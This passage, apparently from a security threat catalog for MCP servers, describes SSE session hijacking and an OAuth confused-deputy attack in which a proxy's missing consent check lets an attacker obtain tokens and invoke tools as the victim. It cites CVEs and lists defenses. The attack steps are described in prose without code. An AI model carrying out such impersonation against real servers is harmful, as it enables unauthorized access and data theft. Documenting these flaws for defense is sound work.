| **Real CVEs** | **CVE-2026-33946** (MCP Ruby SDK — `streamable_http_transport.rb` insufficient session binding; attacker with valid session ID hijacks victim's SSE stream and intercepts all real-time data; fixed in 0.9.2), **GHSA-w2fm-25vw-vh7f** (mcp-handler npm package — race condition in concurrent session handling causes tool responses to leak across sessions; same vulnerability class as CVE-2026-25536). |
| **Detection** | **Very High** — requires transport-layer session integrity checks; invisible at the tool-call or business-logic layer. |

### C3. OAuth Delegation Confused Deputy

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The MCP server's OAuth proxy completes the authorization flow without verifying that the resource owner explicitly consented. When combined with identity providers that skip consent prompts for pre-authorized applications (e.g., GitHub for already-approved OAuth apps), an attacker can silently obtain an authorization code and gain full tool access under the victim's identity. |
| **Example** | An attacker sets up a page that initiates the MCP OAuth flow against a FastMCP server configured with GitHub as the identity provider. The victim (a developer who previously authorized the GitHub OAuth app) visits the page. GitHub skips the consent screen and issues an authorization code directly. The MCP OAuth proxy accepts the code without checking whether consent was given in this session. The attacker now holds a valid token and can invoke all MCP tools as the victim. |
| **Server damage** | Unauthorized tool access under a legitimate user's identity; actions are attributed to the victim; data theft, configuration changes, and lateral movement all appear to come from an authorized user. |
| **Why it fits the selection criteria** | **(1) Architectural:** the vulnerability is in the MCP OAuth delegation chain itself — the proxy implements the OAuth code flow correctly but omits consent verification, a gap specific to how MCP delegates identity to third-party providers. **(2) Indistinguishable:** every HTTP request in the flow is valid and well-formed; the authorization code is genuine; the token is real. The server sees a fully authenticated, apparently consented session. **(3) Agent-mediated:** the OAuth delegation chain exists because agents need delegated access to third-party services through MCP servers — without the agent intermediary, there is no MCP OAuth proxy to exploit. **(4) Business damage:** full impersonation; the attacker operates with the victim's permissions, creating legal liability, data breach, and trust erosion. **(5) Traditional defenses fail:** input validation, rate limiting, and network controls are irrelevant — the attack uses a legitimate OAuth flow. Defense requires explicit consent verification at the proxy layer, state-parameter binding, and PKCE enforcement. |
| **Source** | New — derived from CVE catalog cross-reference against selection criteria. |
| **Real CVEs** | **CVE-2026-27124** (FastMCP — OAuthProxy does not validate user consent on the authorization code callback; combined with GitHub's skip-consent behavior for pre-authorized apps, enables a Confused Deputy attack; CWE-441; CVSS 8.2). |
| **Detection** | **Very High** — requires OAuth-layer consent verification and state-parameter integrity checking; invisible to tool-call monitoring or input validation. |

